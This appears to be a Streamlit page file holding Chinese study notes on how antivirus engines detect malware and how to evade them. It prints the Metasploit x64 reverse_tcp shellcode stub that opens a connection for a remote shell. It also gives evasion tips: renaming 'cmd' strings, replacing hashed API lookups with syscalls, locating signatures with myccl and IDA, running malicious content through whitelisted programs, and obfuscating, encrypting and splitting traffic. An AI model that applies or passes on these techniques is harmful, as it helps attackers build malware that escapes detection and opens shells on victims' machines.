import streamlit as st

"""
## 杀毒软件的基本等级

### 1.无害

没有任何可疑行为，没有任何特征符合病毒

### 2.可疑

存在可疑行为：操作注册表，打开powershell，修改用户，操作敏感文件等

### 3.确认病毒

特征符合病毒

## 杀毒软件的常用识别方式

### 1.静态

通常通过反编译的方式查看源代码

#### 1.1 代码中存在的函数

virtualalloc，rtlmovememory，ntcreatthread等

主要都是windowsapi函数，尤其是和内存、堆、线程相关的函数

当然在python中如果存在“cmd”等关键词也是会被识别的：比如subprocess.popen（“cmd /c”）可以改为subprocess.popen（“命令”）

#### 1.2 shellcode的特征

```
;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Architecture: x64
;-----------------------------------------------------------------------------;
[BITS 64]

; Input: RBP must be the address of 'api_call'.
; Output: RDI will be the socket for the connection to the server
; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15

reverse_tcp:
  ; setup the structures we need on the stack...
  mov r14, 'ws2_32'
  push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
  mov r14, rsp           ; save pointer to the "ws2_32" string for LoadLibraryA call.
  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)
  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
  mov r12, 0x0100007F5C110002        
  push r12               ; host 127.0.0.1, family AF_INET and port 4444
  mov r12, rsp           ; save pointer to sockaddr struct for connect call
  ; perform the call to LoadLibraryA...
  mov rcx, r14           ; set the param for the library to load
  mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp               ; LoadLibraryA( "ws2_32" )
  ; perform the call to WSAStartup...
  mov rdx, r13           ; second param is a pointer to this stuct
  push 0x0101            ;
  pop rcx                ; set the param for the version requested
  mov r10d, 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
  call rbp               ; WSAStartup( 0x0101, &WSAData );
  ; perform the call to WSASocketA...
  push rax               ; if we succeed, rax wil be zero, push zero for the flags param.
  push rax               ; push null for reserved parameter
  xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
  xor r8, r8             ; we do not specify a protocol
  inc rax                ;
  mov rdx, rax           ; push SOCK_STREAM
  inc rax                ;
  mov rcx, rax           ; push AF_INET
  mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
  mov rdi, rax           ; save the socket for later
  ; perform the call to connect...
  push byte 16           ; length of the sockaddr struct
  pop r8                 ; pop off the third param
  mov rdx, r12           ; set second param to pointer to sockaddr struct
  mov rcx, rdi           ; the socket
  mov r10d, 0x6174A599   ; hash( "ws2_32.dll", "connect" )
  call rbp               ; connect( s, &sockaddr, 16 );
  ; restore RSP so we dont have any alignment issues with the next block...
  add rsp, ( (408+8) + (8*4) + (32*4) ) ; cleanup the stack allocations
```

以msf举例，杀毒软件最常用的就是判断 mov r10d, 0x0726774C ; hash( “kernel32.dll”, “LoadLibraryA” )这一部分的代码来识别，通常汇编层级下的代码要深入识别查杀对杀毒软件来说有一定误判的风险，所以一般的杀毒引擎都是通过shellcode中的特征码来识别，比如这一句代码可以用syscall代替试试（也就是直接纯手动找函数偏移而不是直接hash去找）

每个杀毒软件可能找的地方都不一样，推荐使用myccl+ida详细找一下具体查杀的哪个位置

#### 1.3 文件名称或md5

不多介绍，看标题就懂。

#### 1.4 加密（可疑）

使用加密解密行为或者对文件有额外保护措施

### 2.动态

通常这一步都是静态分析之后做的，部分杀毒软件会有沙盒

> 沙盒：也叫启发式查杀，通过模拟计算机的环境执行目标文件再观察特征行为
>
> 沙盒模拟的常见特征：
>
> 内存较小-》不影响计算机正常运行
>
> 时间较快-》沙盒内置的时间速度比现实世界要快，提高查杀速度
>
> 进程或文件不完整-》减少杀毒软件运行时对计算机的消耗
>
> io设备缺失-》鼠标键盘等事件大部分沙盒都没有

#### 2.1 计算机相关

通常由r1或r2层挂监控的方式（类似于hook）当触发这些条件就会产生事件

##### 服务

##### 注册表

##### 组策略

##### 防火墙

##### 敏感程序：

cmd powershell wmi psexec bitsadmin rundll等

##### 用户

添加，删除，修改等操作

##### 文件夹：

C:/windows/system32

C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

C:\tmp等敏感文件夹

##### 常见的绕过思路

白名单调用这些敏感行为，再导入恶意内容

#### 2.2 网络相关

##### IP，域名，证书匹配

查找通讯的ip或域名是否之前存在攻击行为

##### 流量内容

时间特征：扫描等

内容特征：data字段中是否存在命令相关关键词或关键词加密特征

结构特征：是否存在已知远控的通讯结构特征

##### 常见的绕过思路

tcp分段，内容加密，使用合法证书等

## 总结

不是所有的杀毒软件都有这些，有些比较拉跨，有些比较强，不过总体的思路都是差不多的。

### 对编程语言的免杀方式

powershell-》混淆、加密

c++-》编译过程、混淆、加密

python-》混淆、加密

通用-》启发式查杀

### 杀毒软件与反外挂

相同点：都有基于至少r2层的监控（监控不多，主要是驱动证书这类的）

不同点：不需要动态，也就不需要沙盒，反外挂程序会有针对需要保护的程序做dll或者进程的额外监控，部分反外挂程序也会有“扫盘”（也就是对整个计算机文件内容做检测），反外挂程序对应用权限不敏感
"""